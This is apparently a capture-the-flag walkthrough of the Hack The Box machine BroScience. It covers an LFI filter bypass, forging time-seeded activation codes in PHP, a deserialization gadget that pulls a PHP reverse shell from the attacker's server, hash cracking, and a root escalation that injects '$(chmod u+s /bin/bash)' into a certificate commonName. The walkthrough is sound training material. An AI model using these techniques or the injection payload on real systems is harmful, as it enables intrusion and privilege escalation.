# :game_die: BRO SCIENCE [HTB

---

# BRO SCIENCE [HTB | MEDIUM]

Hi, My name is Hashar Mujahid and today we are going to solve a medium box named BroScience on hackthebox.

Let’s start with the TCP nmap scan.

### PORTSCAN:

```
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ sudo nmap -sC -sV -oA nmap/tcp -p- --min-rate 1500 10.10.11.195
[sudo] password for hax-13:
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-17 09:13 PKT
Nmap scan report for 10.10.11.195
Host is up (0.50s latency).
Not shown: 65532 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open http Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open ssl/http Apache httpd 2.4.54 ((Debian))
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after: 2023-07-14T19:48:36
| tls-alpn:
|_ http/1.1
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.67 seconds
```

Add `broscience.htb` to the hosts file.

UDP SCAN:

```
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ sudo nmap -sU -p 1-200 broscience.htb -oA nmap/udp-200
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-17 09:31 PKT
Nmap scan report for broscience.htb (10.10.11.195)
Host is up (0.25s latency).
Not shown: 199 closed ports
PORT STATE SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 213.74 seconds
```

### WEBSITE [PORT 80 & 443]:

When we try to visit the web port 80 redirects the user to port 443 to communicate over SSL.

*Web is built using php*

Found an email address from the SSL cert that website contains. administrator@broscience.htb.

Directory Scan:

I used fuff tool for directory scans you can also use tools like dirsearch, gobuster etc.

```
________________________________________________

:: Method : GET
:: URL : https://broscience.htb/FUZZ
:: Wordlist : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/common.txt
:: Extensions : .php
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200,204,301,302,307,401,403
________________________________________________

.hta.php [Status: 403, Size: 280, Words: 20, Lines: 10]
.htaccess [Status: 403, Size: 280, Words: 20, Lines: 10]
.hta [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd.php [Status: 403, Size: 280, Words: 20, Lines: 10]
.htaccess.php [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd [Status: 403, Size: 280, Words: 20, Lines: 10]
activate.php [Status: 200, Size: 1256, Words: 293, Lines: 28]
comment.php [Status: 302, Size: 13, Words: 3, Lines: 1]
images [Status: 301, Size: 319, Words: 20, Lines: 10]
includes [Status: 301, Size: 321, Words: 20, Lines: 10]
index.php [Status: 200, Size: 9308, Words: 3953, Lines: 147]
index.php [Status: 200, Size: 9308, Words: 3953, Lines: 147]
javascript [Status: 301, Size: 323, Words: 20, Lines: 10]
login.php [Status: 200, Size: 1936, Words: 567, Lines: 42]
logout.php [Status: 302, Size: 0, Words: 1, Lines: 1]
manual [Status: 301, Size: 319, Words: 20, Lines: 10]
register.php [Status: 200, Size: 2161, Words: 635, Lines: 45]
server-status [Status: 403, Size: 280, Words: 20, Lines: 10]
styles [Status: 301, Size: 319, Words: 20, Lines: 10]
user.php [Status: 200, Size: 1309, Words: 300, Lines: 29]
```

Found Some interesting directories. let’s visit them and see what we can find.

SIGNUP:

*Registering*

After registration we got a msg.

*Activation code.*

When we try to log in we get that account has not been activated yet so we need to activate the account to expand our scope.

*Login*

We found an activate.php let's visit it.

*Activate*

Looks like there should be a parameter that contains a input.So let’s use arjun to find a parameter.

```
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ arjun -u https://broscience.htb/activate.php? │1
_ │.
/_| _ ' │1
( |/ /(//) v2.2.1 │9
_/ │5
│$
[*] Probing the target for stability │
[*] Analysing HTTP response for anomalies ├─
[*] Analysing HTTP response for potential parameter names │c
[*] Logicforcing the URL endpoint │e
[✓] parameter detected: code, based on: body length │-
[+] Parameters found: code

```

We found a code parameter.

We also found a user.php page which also takes a parameter to let’s figure out what parameter is used.

```
hax-13@ZARB:~/Documents/ctfs/htb/medium/Broscience-10.10.11.195$ arjun -u https://broscience.htb/user.php?
_
/_| _ '
( |/ /(//) v2.2.1
_/

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[-] Connection timed out, increased timeout by 5 seconds
[✓] parameter detected: id, based on: body length
[+] Parameters found: id
```

But till now nothing seems to work we can access some details about other users using the above parameter but that will not help us root the box.

After looking into the files found a directory that should not normally be public and that is `includes`.

*Source code files*

Let's try to open them. After opening everyone didn’t find anything interesting other that a unique response from img.php.

*Path parameter.*

Let’s test it for local file inclusion or [LFI] because the path parameter loads a file from a given path so having an LFI laying around would be pretty interesting.

*ATTACK DETECTED RUNNNNN!!!!*

Some kind of filter is applied which stops us from retrieving the file let’s try to bypass it.

### LOCAL FILE INCLUSION AND BYPASSING FILTERS:

We can bypass the filter using the double encoding method. Which works by double encoding your payload with URL encoding.

*Source Code retrieved*

Let’s retrieve the activate.php so we can see how the activation code is generated for each user.

```
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
header('Location: /index.php');
}

if (isset($_GET['code'])) {
// Check if code is formatted correctly (regex)
if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
// Check for code in database
include_once 'includes/db_connect.php';

$res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
$res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

if (pg_num_rows($res) == 1) {
// Check if account already activated
$row = pg_fetch_row($res);
if (!(bool)$row[1]) {
// Activate account
$res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
$res = pg_execute($db_conn, "activate_account_query", array($row[0]));

$alert = "Account activated!";
$alert_type = "success";
} else {
$alert = 'Account already activated.';
}
} else {
$alert = "Invalid activation code.";
}
} else {
$alert = "Invalid activation code.";
}
} else {
$alert = "Missing activation code.";
}
?>

<html>
<head>
<title>BroScience : Activate account</title>
<?php include_once 'includes/header.php'; ?>
</head>
<body>
<?php include_once 'includes/navbar.php'; ?>
<div class="uk-container uk-container-xsmall">
<?php
// Display any alerts
if (isset($alert)) {
?>
<div uk-alert class="uk-alert-<?php if(isset($alert_type)){echo $alert_type;}else{echo 'danger';} ?>">
<a class="uk-alert-close" uk-close></a>
<?=$alert?>
</div>
<?php
}
?>
</div>
</body>
</html>
```

Looks like the activation code is 32 characters long. Let’s see in signup.php how it’s generated.

After analyzing the register.php code found the name of the function that is responsible for the generation of activate code( generate_activation_code ).

*SOURCE CODE.*

Let’s retrieve it.

*Activation code source file*

```
function generate_activation_code() {
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
srand(time());
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
$activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
}
return $activation_code;
}
```

by chatgpt :

This code defines a function called “generate_activation_code” which generates a random string of 32 characters in length. The function starts by defining a string of all lowercase and uppercase letters, as well as digits. The “srand(time())” function seeds the random number generator with the current time so that the sequence of random numbers generated is different each time the program runs. The function then initializes an empty string called “activation_code”. A for loop then runs 32 times, and on each iteration, a random character is chosen from the $chars string and added to the “activation_code” string. Finally, the function returns the activation_code.

We can also use the same script to generate the code if we had an exact time when the request is issued.

GENERATING A VALID CODE:

## Get Hashar Mujahid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Get the time when you posted the request for registering the user by using burp. Now all we need to convert the string representation of time to the time format in PHP. I am not a php developer so let’s google.

Let’s try this.

```
<?php
function generate_activation_code() {
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
srand(strtotime("Tue, 17 Jan 2023 16:45:31 GMT"));
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
$activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
}
echo $activation_code;
}
generate_activation_code()
?>
```

*Code*

Let’s try this code to activate our account.

*SUCCESSFULLY ACTIVATED*LOG IN :

Let’s log in with our new account.

We can see a new cookie is set. After doing some source code analysis found that a user-pref cookie is generated through serialization techinique which stores the information about the theme and state.

### FOOTHOLD [WWW-DATA]:

```
class Avatar {
public $imgPath;

public function __construct($imgPath) {
$this->imgPath = $imgPath;
}

public function save($tmp) {
$f = fopen($this->imgPath, "w");
fwrite($f, file_get_contents($tmp));
fclose($f);
}
}

class AvatarInterface {
public $tmp;
public $imgPath;

public function __wakeup() {
$a = new Avatar($this->imgPath);
$a->save($this->tmp);
}
}
?>
```

The avatar class has a parameter img path which is used to point to the path of the image and a tmp parameter opens the img and saves its content on the server.

The avatar interface has a method/function named `__wakeup()` which creates a new instance of avatar class and a class save method for the the avatar class.

So theoretically if we were able to set the img-path to our server and make it receive a PHP shell the tmp path will store it on the server and we could trigger a reverse shell after visiting it.

*SCRIPT*

So Let’s run it and see if we succeeded or not.

*Generated Cookie*

Now just place this cookie in the user-pref and reload the page. Make sure you had a webserver running in the directory where your shell is located.

Now Our shell is saved in the webserver let’s invoke it.

*REVERSE SHELL*

Let’s stabilize our shell.

### PRIVILLEGE ESCALATION [BILL]:

After running linpeas found postgress is running on the localhost adress.

*ACTIVE PORTS*

We can use this resource to inract with psql shell.

We have the credentials to connect to postgress and see if we find any credentials.

*Connect*

Now we can list all the tables in the database using `/dt` command.

*Tables*

Now let’s dump the table.

*Hashes*

These are all md5 hashes which are probably salted as well so let’s see if we can crackem.

*3 cracked*

We were able to crack 3 of them using hashcat by adding salt like “hash:salt” manner.

```
hashcat -m 20 hashes /opt/wordlist/rockyou.txt
```

The only user account we have on the home directory is bill. So we might as try to login with the cradential we found using ssh.

*SUCCESS*

We were able to Login.

### PRIVILLEGE ESCALATION[ ROOT ]:

Run pspy64 on the machine to get the process run by root.

*Intresting process*

Let’s see what renew.sh does.

```
bill@broscience:/opt$ cat renew_cert.sh
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
echo "Usage: $0 certificate.crt";
exit 0;
fi

if [ -f $1 ]; then

openssl x509 -in $1 -noout -checkend 86400 > /dev/null

if [ $? -eq 0 ]; then
echo "No need to renew yet.";
exit 1;
fi

subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

country=$(echo $subject | grep -Eo 'C = .{2}')
state=$(echo $subject | grep -Eo 'ST = .*,')
locality=$(echo $subject | grep -Eo 'L = .*,')
organization=$(echo $subject | grep -Eo 'O = .*,')
organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
commonName=$(echo $subject | grep -Eo 'CN = .*,?')
emailAddress=$(openssl x509 -in $1 -noout -email)
country=${country:4}
state=$(echo ${state:5} | awk -F, '{print $1}')
locality=$(echo ${locality:3} | awk -F, '{print $1}')
organization=$(echo ${organization:4} | awk -F, '{print $1}')
organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

echo $subject;
echo "";
echo "Country => $country";
echo "State => $state";
echo "Locality => $locality";
echo "Org Name => $organization";
echo "Org Unit => $organizationUnit";
echo "Common Name => $commonName";
echo "Email => $emailAddress";

echo -e "\nGenerating certificate...";
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
$state
$locality
$organization
$organizationUnit
$commonName
$emailAddress
" 2>/dev/null

/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
echo "File doesn't exist"
exit 1;
```

This script is a bash script that checks the expiration of a given SSL certificate file, and if it is close to expiring, it will print out information about the certificate such as the country, state, organization, and common name. The script takes one argument, the file name of the certificate, and it uses the openssl command to check the certificate’s expiration date and to extract information from the certificate. The script will exit with a status code of 0 if the certificate does not need to be renewed yet, and 1 if the certificate is close to expiring. [BY CHATGPT]

So if we create a certificate that will expire soon the root will generate a new one and we can see the name of the certificate is whatever we put in `$commonname variable` .

So let’s generate a new certificate that will contain malicious code in the common name so root will execute it.

You can use this link to read how to generate a self signed certificate.

*Cert Generation*

Now we just have to wait for the process to trigger and we have a root.

The `$(chmod u+s /bin/bash)` is used to modify the permissions on /bin/bash and make it suid.

*SUID PERMISSIONS*

We can see we were able to read the root.txt.

Follow me for more.

See You all In next Blog.

---
